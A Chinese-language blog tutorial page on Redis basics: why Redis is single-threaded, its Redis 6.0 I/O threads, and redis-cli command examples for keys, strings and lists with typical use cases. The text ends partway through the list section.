<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Redis基础详解 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Redis基础详解</h1>
			
		</header>
		<div class="content post__content clearfix">
			


        
                <div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="-toc" style="margin-left:0px"></p> 
<p id="%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0-toc" style="margin-left:0px"><a href="#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0">一、概述</a></p> 
<p id="redis%E4%BD%9C%E7%94%A8-toc" style="margin-left:40px"><a href="#redis%E4%BD%9C%E7%94%A8">redis作用</a></p> 
<p id="redis%E7%89%B9%E6%80%A7-toc" style="margin-left:40px"><a href="#redis%E7%89%B9%E6%80%A7">redis特性</a></p> 
<p id="%E4%BA%8C%E3%80%81Redis%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-toc" style="margin-left:0px"><a href="#%E4%BA%8C%E3%80%81Redis%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">二、Redis基础知识</a></p> 
<p id="%E4%B8%BA%E4%BB%80%E4%B9%88Redis%E6%98%AF%E5%8D%95%E7%BA%BF%E7%A8%8B%E7%9A%84%EF%BC%9F-toc" style="margin-left:40px"><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88Redis%E6%98%AF%E5%8D%95%E7%BA%BF%E7%A8%8B%E7%9A%84%EF%BC%9F">为什么Redis是单线程的？</a></p> 
<p id="Redis%E7%9A%84%E9%AB%98%E5%B9%B6%E5%8F%91%E5%92%8C%E5%BF%AB%E9%80%9F%E5%8E%9F%E5%9B%A0%EF%BC%9F-toc" style="margin-left:40px"><a href="#Redis%E7%9A%84%E9%AB%98%E5%B9%B6%E5%8F%91%E5%92%8C%E5%BF%AB%E9%80%9F%E5%8E%9F%E5%9B%A0%EF%BC%9F">Redis的高并发和快速原因？</a></p> 
<p id="Redis6.0%20%E4%B9%8B%E5%90%8E%E4%B8%BA%E4%BD%95%E5%BC%95%E5%85%A5%E4%BA%86%E5%A4%9A%E7%BA%BF%E7%A8%8B%EF%BC%9F-toc" style="margin-left:80px"><a href="#Redis6.0%20%E4%B9%8B%E5%90%8E%E4%B8%BA%E4%BD%95%E5%BC%95%E5%85%A5%E4%BA%86%E5%A4%9A%E7%BA%BF%E7%A8%8B%EF%BC%9F">Redis6.0 之后为何引入了多线程？</a></p> 
<p id="%E4%B8%89%E3%80%81Redis%E4%BA%94%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%8C%E4%B8%89%E7%A7%8D%E7%89%B9%E6%AE%8A%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-toc" style="margin-left:0px"><a href="#%E4%B8%89%E3%80%81Redis%E4%BA%94%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%8C%E4%B8%89%E7%A7%8D%E7%89%B9%E6%AE%8A%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">三、Redis五大数据类型，三种特殊数据类型</a></p> 
<p id="%E5%90%AF%E5%8A%A8Redis-toc" style="margin-left:40px"><a href="#%E5%90%AF%E5%8A%A8Redis">启动Redis</a></p> 
<p id="Redis-Key-toc" style="margin-left:40px"><a href="#Redis-Key">Redis-Key</a></p> 
<p id="String%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89-toc" style="margin-left:0px"><a href="#String%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89">String（字符串）</a></p> 
<p id="%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF-toc" style="margin-left:80px"><a href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF">应用场景</a></p> 
<p id="LIst%EF%BC%88%E5%88%97%E8%A1%A8%EF%BC%89-toc" style="margin-left:0px"><a href="#LIst%EF%BC%88%E5%88%97%E8%A1%A8%EF%BC%89">LIst（列表）</a></p> 
<p id="%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF-toc" style="margin-left:80px"><a href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF">应用场景</a></p> 
<p id="Set(%E9%9B%86%E5%90%88)-toc" style="margin-left:0px"><a href="#Set%28%E9%9B%86%E5%90%88%29">Set(集合)</a></p> 
<p id="%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF-toc" style="margin-left:80px"><a href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF">应用场景</a></p> 
<p id="Hash%EF%BC%88%E5%93%88%E5%B8%8C%EF%BC%89-toc" style="margin-left:0px"><a href="#Hash%EF%BC%88%E5%93%88%E5%B8%8C%EF%BC%89">Hash（哈希）</a></p> 
<p id="%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF-toc" style="margin-left:80px"><a href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF">应用场景</a></p> 
<p id="Sorted%20set%EF%BC%88Zset%E6%9C%89%E5%BA%8F%E9%9B%86%E5%90%88%EF%BC%89-toc" style="margin-left:0px"><a href="#Sorted%20set%EF%BC%88Zset%E6%9C%89%E5%BA%8F%E9%9B%86%E5%90%88%EF%BC%89">Sorted set（Zset有序集合）</a></p> 
<p id="%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF-toc" style="margin-left:80px"><a href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF">应用场景</a></p> 
<p id="geospatial%EF%BC%88%E5%9C%B0%E7%90%86%E4%BD%8D%E7%BD%AE%EF%BC%89-toc" style="margin-left:0px"><a href="#geospatial%EF%BC%88%E5%9C%B0%E7%90%86%E4%BD%8D%E7%BD%AE%EF%BC%89">geospatial（地理位置）</a></p> 
<p id="Hyperloglog-toc" style="margin-left:0px"><a href="#Hyperloglog">Hyperloglog</a></p> 
<p id="Bitmaps-toc" style="margin-left:0px"><a href="#Bitmaps">Bitmaps</a></p> 
<p id="%E5%9B%9B%E3%80%81%E4%BA%8B%E5%8A%A1-toc" style="margin-left:0px"><a href="#%E5%9B%9B%E3%80%81%E4%BA%8B%E5%8A%A1">四、事务</a></p> 
<p id="%E4%B9%90%E8%A7%82%E9%94%81%E5%92%8C%E6%82%B2%E8%A7%82%E9%94%81-toc" style="margin-left:40px"><a href="#%E4%B9%90%E8%A7%82%E9%94%81%E5%92%8C%E6%82%B2%E8%A7%82%E9%94%81">乐观锁和悲观锁</a></p> 
<p id="redis%E7%9B%91%E8%A7%86%E6%B5%8B%E8%AF%95%C2%A0%20watch%20unwatch%20-----redis%E5%AE%9E%E7%8E%B0%E4%B9%90%E8%A7%82%E9%94%81-toc" style="margin-left:40px"><a href="#redis%E7%9B%91%E8%A7%86%E6%B5%8B%E8%AF%95%C2%A0%20watch%20unwatch%20-----redis%E5%AE%9E%E7%8E%B0%E4%B9%90%E8%A7%82%E9%94%81">redis监视测试  watch unwatch -----redis实现乐观锁</a></p> 
<p id="%E4%BA%94%E3%80%81Jedis%EF%BC%88%E4%BD%BF%E7%94%A8Java%E6%9D%A5%E6%93%8D%E4%BD%9C%20Redis%EF%BC%89-toc" style="margin-left:0px"><a href="#%E4%BA%94%E3%80%81Jedis%EF%BC%88%E4%BD%BF%E7%94%A8Java%E6%9D%A5%E6%93%8D%E4%BD%9C%20Redis%EF%BC%89">五、Jedis（使用Java来操作 Redis）</a></p> 
<p id="%E5%85%AD%E3%80%81SpringBoot%E9%9B%86%E6%88%90Redis-toc" style="margin-left:0px"><a href="#%E5%85%AD%E3%80%81SpringBoot%E9%9B%86%E6%88%90Redis">六、SpringBoot集成Redis</a></p> 
<p id="%E6%95%B4%E5%90%88%E6%B5%8B%E8%AF%95-toc" style="margin-left:40px"><a href="#%E6%95%B4%E5%90%88%E6%B5%8B%E8%AF%95">整合测试</a></p> 
<p id="%E4%B8%83%E3%80%81%E8%87%AA%E5%AE%9A%E4%B9%89RedisTemplate-toc" style="margin-left:0px"><a href="#%E4%B8%83%E3%80%81%E8%87%AA%E5%AE%9A%E4%B9%89RedisTemplate">七、自定义RedisTemplate</a></p> 
<p id="%C2%A0%E8%87%AA%E5%AE%9A%E4%B9%89redisTemplate-toc" style="margin-left:40px"><a href="#%C2%A0%E8%87%AA%E5%AE%9A%E4%B9%89redisTemplate"> 自定义redisTemplate</a></p> 
<p id="RedisUtil%E5%B0%81%E8%A3%85%E5%B7%A5%E5%85%B7%E7%B1%BB-toc" style="margin-left:40px"><a href="#RedisUtil%E5%B0%81%E8%A3%85%E5%B7%A5%E5%85%B7%E7%B1%BB">RedisUtil封装工具类</a></p> 
<p id="%E6%B5%8B%E8%AF%95%E7%B1%BB-toc" style="margin-left:40px"><a href="#%E6%B5%8B%E8%AF%95%E7%B1%BB">测试类</a></p> 
<p id="Redis.conf%E8%AF%A6%E8%A7%A3-toc" style="margin-left:0px">八、<a href="#Redis.conf%E8%AF%A6%E8%A7%A3">Redis.conf详解</a></p> 
<p id="%E5%8D%95%E4%BD%8D-toc" style="margin-left:80px"><a href="#%E5%8D%95%E4%BD%8D">单位</a></p> 
<p id="%E5%8C%85%E5%90%AB-toc" style="margin-left:80px"><a href="#%E5%8C%85%E5%90%AB">包含</a></p> 
<p id="%E7%BD%91%E7%BB%9C-toc" style="margin-left:80px"><a href="#%E7%BD%91%E7%BB%9C">网络</a></p> 
<p id="%E9%80%9A%E7%94%A8GENERAL-toc" style="margin-left:80px"><a href="#%E9%80%9A%E7%94%A8GENERAL">通用GENERAL</a></p> 
<p id="%E5%BF%AB%E7%85%A7-toc" style="margin-left:80px"><a href="#%E5%BF%AB%E7%85%A7">快照</a></p> 
<p id="REPLICATION%E5%A4%8D%E5%88%B6-toc" style="margin-left:80px"><a href="#REPLICATION%E5%A4%8D%E5%88%B6">REPLICATION复制</a></p> 
<p id="SECURITY%E5%AE%89%E5%85%A8-toc" style="margin-left:80px"><a href="#SECURITY%E5%AE%89%E5%85%A8">SECURITY安全</a></p> 
<p id="CLIENTS%E9%99%90%E5%88%B6-toc" style="margin-left:80px"><a href="#CLIENTS%E9%99%90%E5%88%B6">CLIENTS限制</a></p> 
<p id="APPEND%20ONLY%20%E6%A8%A1%E5%BC%8Faof%E9%85%8D%E7%BD%AE-toc" style="margin-left:80px"><a href="#APPEND%20ONLY%20%E6%A8%A1%E5%BC%8Faof%E9%85%8D%E7%BD%AE">APPEND ONLY 模式aof配置</a></p> 
<p id="-toc" style="margin-left:80px"></p> 
<h1 id="%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0">一、概述</h1> 
<p><strong>Redis（<span style="color:#ff9900">Re</span>mote <span style="color:#ff9900">Di</span>ctionary<span style="color:#ff9900"> S</span>erver )，即远程字典服务</strong>，是一个开源的使用ANSI <a href="https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80?fromModule=lemma_inlink" title="C语言">C语言</a>编写、<span style="color:#ff9900"><strong>支持网络</strong></span>、可基于内存亦<span style="color:#ff9900"><strong>可持久化</strong></span>的日志型、<strong><span style="color:#ff9900">Key-Value<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728?fromModule=lemma_inlink" title="数据库">数据库</a></span></strong>，并<strong><span style="color:#ff9900">提供多种语言的API</span></strong>。</p> 
<p><img alt="" height="130" src="https://images2.imgbox.com/0b/b7/ZMofQPqi_o.png" width="599"></p> 
<p><strong>redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步</strong>。免费和开源!是当下最热门的 NoSQL技术之一!也被人们称之为结构化数据库!</p> 
<h2 id="redis%E4%BD%9C%E7%94%A8">redis作用</h2> 
<ol>
<li>内存存储、持久化，内存中是断电即失、所以说持久化很重要( rdb、aof )</li>
<li>效率高，可以用于高速缓存</li>
<li>发布订阅系统</li>
<li>地图信息分析</li>
<li>计时器、计数器（浏览量!)</li>
<li>......….</li>
</ol> 
<h2 id="redis%E7%89%B9%E6%80%A7">redis特性</h2> 
<ul>
<li>多样的数据类型</li>
<li>持久化</li>
<li>集群</li>
<li>事务</li>
</ul> 
<h1 id="%E4%BA%8C%E3%80%81Redis%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">二、Redis基础知识</h1> 
<p><strong>redis默认有16个数据库，默认使用的是第0个，使用6379为默认端口，不区分大小写命令</strong></p> 
<p>可以从redis.conf文件中查看<img alt="" height="123" src="https://images2.imgbox.com/a2/bd/cu7cXchM_o.png" width="412"></p> 
<p>可以使用<strong><span style="background-color:#ffd900">select</span></strong>切换数据库，使用<strong><span style="background-color:#ffd900">dbsize</span></strong>查看数据库大小</p> 
<pre><code>127.0.0.1:6379&gt;select 3    #切换数据库
OK
127.0.0.1:6379[3]&gt;DBSIZE   #查看DB大小
(integer) 0
127.0.0.1:6379[3]&gt;set name qq  #3号数据库添加一条内容
OK
127.0.0.1:6379[3]&gt;DBSIZE   #查看DB大小
(integer)1
127.0.0.1:6379[3]&gt;select 7  
0K
127.0.0.1:6379[7]&gt;DBSIZE
( integer)0
i27.0.0.1:6379[7]&gt;get name
(nil)
127.0.0.1:6379[7]&gt;select 3
OK
127.0.0.1:6379[3]&gt;get name
"qq"</code></pre> 
<p><strong><span style="background-color:#ffd900">keys *</span></strong> 查看所有的key</p> 
<blockquote> 
 <p>127.0.0.1:6379[3]&gt; <strong>keys *</strong>   #查看数据库所有的key</p> 
 <p>1)"name"</p> 
</blockquote> 
<p>清除当前数据库<strong><span style="background-color:#ffd900">flushdb </span></strong></p> 
<p>清除全部数据库的内容<strong><span style="background-color:#ffd900">FLUSHALL</span></strong></p> 
<blockquote> 
 <p>127.0.0.1:6379[3]&gt; flushdb</p> 
 <p>OK<br> 127.0.0.1:6379[3]&gt; keys *</p> 
 <p>(empty list or set)</p> 
</blockquote> 
<h2 id="%E4%B8%BA%E4%BB%80%E4%B9%88Redis%E6%98%AF%E5%8D%95%E7%BA%BF%E7%A8%8B%E7%9A%84%EF%BC%9F"><span style="color:#be191c">为什么Redis是单线程的？</span></h2> 
<p>因为<strong>Redis是基于内存的操作</strong>，<strong>CPU不是Redis的瓶颈</strong>，Redis的瓶颈最有可能是机器内存的大小或者网络带宽。在单线程的情况下，就<strong>不用去考虑各种锁的问题</strong>，不存在加锁、释放锁操作，没有因为可能出现死锁而<strong>导致的性能消耗</strong>。既然<strong>单线程容易实现</strong>，而且CPU不会成为瓶颈，那就顺理成章地采用单线程的方案了。</p> 
<p><span style="color:#be191c"><strong>既然是单线程，那怎么监听大量的客户端连接呢？</strong></span></p> 
<p>Redis 通过<strong>IO 多路复用程序</strong> 来监听来自客户端的大量连接（或者说是监听多个 socket），它会将感兴趣的事件及类型(读、写）注册到内核中并监听每个事件是否发生。这样的好处非常明显： <strong>I/O 多路复用技术的使用让 Redis 不需要额外创建多余的线程来监听客户端的大量连接，降低了资源的消耗</strong>（和 NIO 中的 <code>Selector</code> 组件很像）。</p> 
<h2 id="Redis%E7%9A%84%E9%AB%98%E5%B9%B6%E5%8F%91%E5%92%8C%E5%BF%AB%E9%80%9F%E5%8E%9F%E5%9B%A0%EF%BC%9F"><span style="color:#be191c">Redis的高并发和快速原因？</span></h2> 
<p>1.redis是基于内存的，内存的读写速度非常快（纯内存）; 数据存在内存中，数据结构用HashMap，HashMap的优势就是查找和操作的时间复杂度都是O(1)。</p> 
<p>2.redis是单线程的，省去了很多上下文切换线程的时间（避免线程切换和竞态消耗）。</p> 
<p>3.redis使用IO多路复用技术（IO multiplexing, 解决对多个I/O监听时,一个I/O阻塞影响其他I/O的问题），可以处理并发的连接（非阻塞IO）。</p> 
<h3 id="Redis6.0%20%E4%B9%8B%E5%90%8E%E4%B8%BA%E4%BD%95%E5%BC%95%E5%85%A5%E4%BA%86%E5%A4%9A%E7%BA%BF%E7%A8%8B%EF%BC%9F"><span style="color:#be191c">Redis6.0 之后为何引入了多线程？</span></h3> 
<p><strong>Redis6.0 引入多线程主要是为了提高网络 IO 读写性能</strong>，因为这个算是 Redis 中的一个性能瓶颈（Redis 的瓶颈主要受限于内存和网络）。<strong>虽然，Redis6.0 引入了多线程</strong>，<strong>但是 Redis 的多线程只是在网络数据的读写这类耗时操作上使用了，在核心的消费模块</strong><strong>执行命令仍然是单线程顺序执行</strong>。因此，不需要担心线程安全问题。Redis6.0 的多线程默认是禁用的，只使用主线程。如需开启需要修改 redis 配置文件 <code>redis.conf</code> </p> 
<blockquote> 
 <p>io-threads-do-reads yes</p> 
</blockquote> 
<p><strong>开启多线程后，还需要设置线程数，否则是不生效的。</strong>同样需要修改 redis 配置文件 <code>redis.conf</code> </p> 
<blockquote> 
 <p>io-threads 4 #官网建议4核的机器建议设置为2或3个线程，8核的建议设置为6个线程</p> 
</blockquote> 
<h1 id="%E4%B8%89%E3%80%81Redis%E4%BA%94%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%8C%E4%B8%89%E7%A7%8D%E7%89%B9%E6%AE%8A%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">三、Redis五大数据类型，三种特殊数据类型</h1> 
<p><img alt="" height="266" src="https://images2.imgbox.com/20/80/5buwLE4N_o.png" width="1021"></p> 
<p>Redis是一个开源（BSD许可)的，内存中的数据结构存储系统，它<strong>可以用作数据库、缓存和消息中间件</strong>。它支持多种类型的数据结构，如<span style="color:#ff9900"><strong>字符串 ( strings ）)，散列 ( hashes )，列表( lists )，集合( sets )，有序集合( sorted sets）</strong></span>与<span style="color:#ff9900"><strong>范围查询bitmaps ， hyperloglogs和地理空间(geospatial）索引半径查询</strong></span>。Redis内置了复制( replication )，LUA脚本(Luascripting)，LRU驱动事件( LRU eviction )，事务 ( transactions ）和不同级别的磁盘持久化 ( persistence)，并通过Redis哨兵( Sentinel )和自动分区( Cluster )提供高可用性( high availability )。</p> 
<blockquote> 
 <h2 id="%E5%90%AF%E5%8A%A8Redis">启动Redis</h2> 
 <p>1、启动Redis</p> 
 <p>建议通过配置文件来启动Redis。</p> 
 <pre><code>&gt; redis-server xx/xx/redis.conf</code></pre> 
 <p>2、连接Redis</p> 
 <pre><code>&gt; redis-cli -p 6379</code></pre> 
 <p>3、测试连通性</p> 
 <pre><code>127.0.0.1:6379&gt; ping
PONG</code></pre> 
 <p>确保redis运行 </p> 
 <pre><code>ps -ef|grep redis</code></pre> 
 <p> 4、停止Redis</p> 
 <pre><code>&gt; redis-cli shutdown

&gt; kill redis-pid</code></pre> 
 <p>以上两条停止Redis命令效果一样。</p> 
</blockquote> 
<blockquote> 
 <h2 id="Redis-Key">Redis-Key</h2> 
 <p>127.0.0.1:6379&gt; set age 1 #设置值</p> 
 <p>127.0.0.1:6379&gt; get age # 根据 key 获得对应的 value</p> 
 <p>127.0.0.1:6379&gt; keys * #查看所有key值</p> 
 <p>127.0.0.1:6379&gt; EXISTS  age #判断某个 key 是否存在</p> 
 <p>127.0.0.1:6379&gt; move age 1 #在当前库移除age，1代表当前库</p> 
 <p>127.0.0.1:6379&gt; expire age  60 #设置过期时间 数据在 60s 后过期</p> 
 <p>127.0.0.1:6379&gt; ttl age # 查看数据还有多久过期</p> 
 <p>127.0.0.1:6379&gt; type age # 查看当前key的类型</p> 
</blockquote> 
<h1 id="String%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89"><span style="background-color:#ffd900">String（字符串）</span></h1> 
<blockquote> 
 <p>127.0.0.1:6379&gt; set key1 v1  #设置值<br> 127.0.0.1:6379&gt; get key1    #获得值<br> 127.0.0.1:6379&gt; keys *  #获得所有的key<br> 127.0.0.1:6379&gt; EXISTS key1  #判断某一个key是否存在<br> 127.0.0.1:6379&gt;<strong>APPEND</strong> key1 "hello"  <strong>#追加字符串，如果当前key不存在，就相当setkey</strong><br> 127.0.0.1:6379&gt; get key1</p> 
 <p>"v1hello"<br> 127.0.0.1:6379&gt;<strong>STRLEN</strong> key1  <strong>#获取字符串的长度!</strong></p> 
 <p>#########################################################################</p> 
 <p><strong><span style="background-color:#ffd900">i++</span></strong></p> 
 <p><strong><span style="background-color:#ffd900">i+=</span></strong></p> 
 <p>127.0.0.1:6379&gt; <strong>incr</strong> number # <strong>自增1</strong> 将 key 中储存的数字值增一</p> 
 <p>127.0.0.1:6379&gt; <strong>decr</strong> number #<strong> 自减1</strong>  将 key 中储存的数字值减一</p> 
 <p>127.0.0.1:6379&gt;<strong>INCRBY</strong> views 10   # 可以<strong>设置步长</strong>，指定增量!<br> 127.0.0.1:6379&gt;<strong>DECRBY</strong> views 10   # 可以设置步长，指定减量!</p> 
 <p>####################################################################</p> 
 <p><strong><span style="background-color:#ffd900">字符串范围range</span></strong><br> 127.0.0.1:6379&gt; <strong>GETRANGE</strong> key1 <strong>0 3  </strong>#<strong>截取字符串[0,3]</strong><br> 127.0.0.1:6379&gt;GETRANGE key1 <strong>0 -1  </strong>#<strong>获取全部的字符串 和 get key是一样的</strong><br> 127.0.0.1:6379&gt;<strong>SETRANGE</strong> key2 1 xx  #<strong>替换</strong>从指定位置开始的字符串!</p> 
 <p>####################################################################### <strong><span style="background-color:#ffd900">setex (set with expire)#设置过期时间</span><br><span style="background-color:#ffd900">setnx (set if not exist)#不存在在设置（在分布式锁中会常常使用!)</span></strong><br> 127.0.0.1:6379&gt; setex key3 30 "he11o"  #设置key3 的值为hello,30秒后过期<br> 127.0.0.1:6379&gt; setnx mykey "redis"   #如果mykey 不存在，创建mykey</p> 
 <p>(integer) 1<br> 127.0.0.1:6379&gt; setnx mykey "MongoDB"   #如果mykey存在，创建失败!</p> 
 <p>(integer) 0<br> 127.0.0.1:6379&gt; get mykey</p> 
 <p>"redis"<br> ######################################################################</p> 
 <p><strong><span style="background-color:#ffd900">批量设置mset mget</span></strong><br> 127.0.0.1:6379&gt; mset k1 v1 k2 v2 k3 v3   #同时设置多个值<br> 127.0.0.1:6379&gt; mget k1 k2 k3  #同时获取多个值<br> 127.0.0.1:6379&gt; <strong>msetnx</strong> k1 v k4 v4  <strong> #msetnx是一个原子性的操作，要么一起成功，要么一起失败!</strong></p> 
 <p>(integer) 0<br> 127.0.0.1:6379&gt; get k4</p> 
 <p>(nil)<br><span style="color:#ff9900"><strong>#对象</strong></span><br> set user:1 {name:zhangsan , age:3]#设置一个user:1对象值为json字符来保存一个对象!<br> # 这里的key是一个巧妙的设计: <span style="color:#ff9900"><strong>user:{id}:{filed} </strong></span>,如此设计在Redis中是完全oK了!<br> 127.0.0.1:6379&gt; <strong>mset user: 1:name zhangsan user:1:age 2</strong><br> 127.0.0.1:6379&gt; <strong>mget user: 1:name user: 1:age</strong></p> 
 <p>1) "zhangsan"<br> 2) "2"<br> ##################################################################</p> 
 <p><strong><span style="background-color:#ffd900">getset</span></strong> # 先get然后在set<br> 127.0.0.1:6379&gt; getset db redis  <strong># 如果不存在值，则返回 nil</strong></p> 
 <p>(nil)<br> 127.0.0.1:6379&gt; get db</p> 
 <p>"redis"<br> 127.0.0.1:6379&gt; getset db mongodb <strong>#如果存在值，获取原来的值，并设置新的值</strong></p> 
 <p>"redis"<br> 127.0.0.1:6379&gt; get db</p> 
 <p>"mongodb"</p> 
</blockquote> 
<h3 id="%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span style="color:#eaf4fc"><span style="background-color:#ed7976">应用场景</span></span></h3> 
<ul>
<li>
<strong><span style="background-color:#e7fafa">1、缓存功能</span></strong>：部分数据第一次查询查询数据库，查询完后存入redis中，后续再获取可以从redis中获取</li>
<li>
<strong><span style="background-color:#e7fafa">2、验证码：</span></strong>网站登录中常有验证码，我们可以用此数据类型，手机号作为key，验证码作为value存储在redis中，设置过期时间，后续如果用户输入验证码，我们从redis中取值对比，如果过期则无效</li>
<li>
<strong><span style="background-color:#e7fafa">3、数字计数</span></strong>：点赞数、访问量、关注数等</li>
<li><strong><span style="background-color:#e7fafa">4、存储对象</span></strong></li>
<li>
<strong><span style="background-color:#e7fafa">5、共享session  </span></strong>  分布式服务会将用户信息的访问均衡到不同服务器上，用户刷新一次访问可能会需要重新登录，为避免这个问题可以用redis将用户session集中管理，每次获取用户更新或查询登录信息都直接从redis中集中获取</li>
<li>
<strong><span style="background-color:#e7fafa">6、分布式锁</span></strong>     string类型的setnx的作用是“当key不存在时，设值并返回1，当key已经存在时，不设值并返回0”，“判断key是否存在"和"设值"两个操作是原子性地执行的，因此可以用string类型作为分布式锁，返回1表示获得锁，返回0表示没有获得锁。适用场景：在一个集群环境下，多个web应用时对同一个商品进行抢购和减库存操作时，可能出现超卖时会用到分布式锁</li>
</ul> 
<h1 id="LIst%EF%BC%88%E5%88%97%E8%A1%A8%EF%BC%89"><span style="background-color:#ffd900">LIst（列表）</span></h1> 
<p>Redis 的 list 的实现为一个 <strong>双向链表</strong>，即可以支持反向查找和遍历，更方便操作，不过带来了部分额外的内存开销。在redis里面，我们可以把list，用作栈、队列、消息队列，<strong>所有list命令都是以l开头的</strong></p> 
<p><img alt="" height="187" src="https://images2.imgbox.com/b5/da/EDGGRLxv_o.png" width="1025"></p> 
<blockquote> 
 <p>###################################################################</p> 
 <p><strong><span style="background-color:#ffd900">LPUSH 、Rpush、 LRANGE</span></strong></p> 
 <p>127.0.0.1:6379&gt;<strong>LPUSH </strong>list one    <strong> # 将一个值或者多个值，插入到列表头部（左)</strong><br> 127.0.0.1:6379&gt; LPUSH list two    # two  one<br> 127.0.0.1:6379&gt; LPUSH list three   # three two  one<br> 127.0.0.1:6379&gt; <strong>LRANGE</strong> list <strong>0 1</strong>   <strong># 查看对应下标的list列表</strong>， 0 为 start,1为 end</p> 
 <p>1) "three"<br> 2)"two"<br> 127.0.0.1:6379&gt; <strong>Rpush</strong> list righr <strong>#将一个值或者多个值，插入到列表位部(右)</strong><br> 127.0.0.1:6379&gt;LRANGE list 0 -1    # three two  one  righr</p> 
 <p>1) "three"<br> 2)"two"</p> 
 <p>3) "one"</p> 
 <p>4) "righr"</p> 
 <p>###################################################################</p> 
 <p><strong><span style="background-color:#ffd900">LPOP 、 RPOP</span></strong><br> 127.0.0.1:6379&gt; <strong>Lpop </strong>list  <strong>#移除list的第一个元素</strong>"three"<br> 127.0.0.1:6379&gt; <strong>Rpop</strong> list   <strong>#移除list的最后一个元素</strong>"righr"</p> 
 <p><strong><span style="background-color:#ffd900">Lindex</span></strong><br> 127.0.0.1:6379&gt; <strong>lindex</strong> list <strong>1</strong> <strong># 通过下标获得list中的某一个值</strong><br><strong><span style="background-color:#ffd900">Llen</span></strong><br> 127.0.0.1:6379&gt; llen list  <strong># 返回列表的长度</strong></p> 
 <p><strong><span style="background-color:#ffd900">Lrem</span></strong></p> 
 <p>127.0.0.1:6379&gt; Lrem list 3 one<strong> # 移除list集合中指定个数的value，精确匹配  </strong>移除三个one<br><strong><span style="background-color:#ffd900">Ltrim</span></strong></p> 
 <p>127.0.0.1:6379&gt;ltrim mylist 1 2 <strong>#通过下标截取指定的长度，这个list已经被改变了，截断了只剩下截取的元素!</strong></p> 
 <p>###################################################################<br><strong><span style="background-color:#ffd900">rpoplpush</span></strong> <br> 127.0.0.1:6379&gt; rpush mylist "hello"<br> 127.0.0.1:6379&gt; rpush mylist "hello1"<br> 127.0.0.1:6379&gt; rpush my1ist "hello2"   # hello  hello1  hello2</p> 
 <p>127.0.0.1:6379&gt;<strong>rpoplpush mylist myotherlist #移除列表的最后一个元素，将他移动到新的列表中!</strong><br> 127.0.0.1:6379&gt; lrange mylist 0 -1 # 查看原来的列表</p> 
 <p>1) "hello"<br> 2) "hello1"<br> 127.0.0.1:6379&gt; lrange myotherlist 0 -1 #查看目标列表中，确实存在改值!</p> 
 <p>1) "hello2"</p> 
 <p>###################################################################<br><strong><span style="background-color:#ffd900">Lset  </span>将列表中指定下标的值替换为另外一个值，更新操作</strong></p> 
 <p>127.0.0.1:6379&gt; EXISTS list  #判断这个列表是否存在<br> 127.0.0.1:6379&gt; lset list 0 item <strong>#如果不存在列表我们去更新就会报错</strong></p> 
 <p>(error) ERR no such key<br> 127.0.0.1:6379&gt; lpush list value1</p> 
 <p>(integer) 1<br> 127.0.0.1:6379&gt; LRANGE list 0 0</p> 
 <p>1) "value1"<br> 127.0.0.1:6379&gt;<strong> lset list 0 item #如果存在，更新当前下标0的值，为item</strong><br> 127.0.0.1:6379&gt; LRANGE list 0 0</p> 
 <p>1) "item"<br> 127.0.0.1:6379&gt; lset list 1 other <strong>#如果列表元素不存在，也会报错!</strong></p> 
 <p>(error) ERR index out of range</p> 
 <p>###################################################################</p> 
